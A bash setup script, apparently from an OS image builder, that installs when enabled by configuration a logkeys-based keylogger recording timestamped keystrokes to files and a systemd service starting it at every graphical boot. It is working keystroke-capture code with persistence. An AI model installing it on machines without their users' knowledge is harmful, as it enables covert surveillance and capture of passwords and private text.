#!/bin/bash
#
# Setup for keylogger
#

function keylogger()
{
  # config->keylogger
  if [ "$(config_value "keylogger")" = "True" ]; then

    c="$(config_value "keylogger_keymap")"
    keymap="${c:-"en_US"}"

    c="$(config_value "keylogger_path")"
    path="${c:-"/home/user/ScreenCapture"}"

    # create keylogger script
    cat <<EOF1 >"${initrd}/newroot/usr/bin/keylogger"
#!/bin/bash

path="${path}"
keymap="${keymap}"
chunk="10" # in seconds

# find the keymap file from the locale
if [ "\${keymap}" = "auto" ]; then
    set -o allexport
    . <(locale) 
    set +o allexport
    keymap="\${LANG%%.*}"
fi

# fall back if keymap does not exist
if [ ! -r "/usr/share/logkeys/keymaps/\${keymap}.map" ]; then
    keymap="en_US"
fi
mkdir -p "${path}"

logkeys --start --no-daemon --no-timestamps --keymap "/usr/share/logkeys/keymaps/\${keymap}.map" -o - | while read -n1 char; do
    # outputs enclosed in square brackets like <enter> should be on one line
    if [ "\$char" = "<" ]; then
        concat="yes"
    fi

    if [ "\${concat-no}" = "yes" ]; then
        string="\${string}\${char}"
    elif [ "\${concat-no}" = "no" ]; then
        echo "\${string}\${char}"
        string=""
    fi

    if [ "\$char" = ">" ]; then
        concat="no"
        echo "\${string}"
        string=""
    fi
done | while IFS= read -r line; do
    # add correct millisecondtimestamp to the line and store it in the file named by the timestamp
    date="\${date-\$(date +%s)}"
    now="\$(date +%s)"
    expire=\$(expr \$date + \$chunk)

    if [ "\$now" -gt "\$expire" ]; then
        date="\${now}"
    fi
    echo "\$(date +%s%3N) \$line" >> "\${path}/keylogger\${date}.key"
done
EOF1

    chmod 755 "${initrd}/newroot/usr/bin/keylogger"

    # create keylogger systemd daemon
    cat <<EOF2 >"${initrd}/newroot/etc/systemd/system/keylogger.service"
[Unit]
Description=keylogger

[Service]
Type=simple
WorkingDirectory=${path}
ExecStart=/usr/bin/keylogger
ExecStopPost=/bin/bash -c 'mv -v *.key launch/'
Restart=always
RestartSec=10

[Install]
WantedBy=graphical.target
EOF2

    chroot ${initrd}/newroot mkdir "${path}"
    chroot ${initrd}/newroot systemctl enable keylogger.service

    # setup the launch timer
    cat <<EOF3 >>"${initrd}/newroot/etc/launch.conf"
# keylogger
threshold+=("0m")
path+=("${path}")
hardlink+=("")
move+=("*.key")
remove+=("")
log+=("")

EOF3

  fi

}
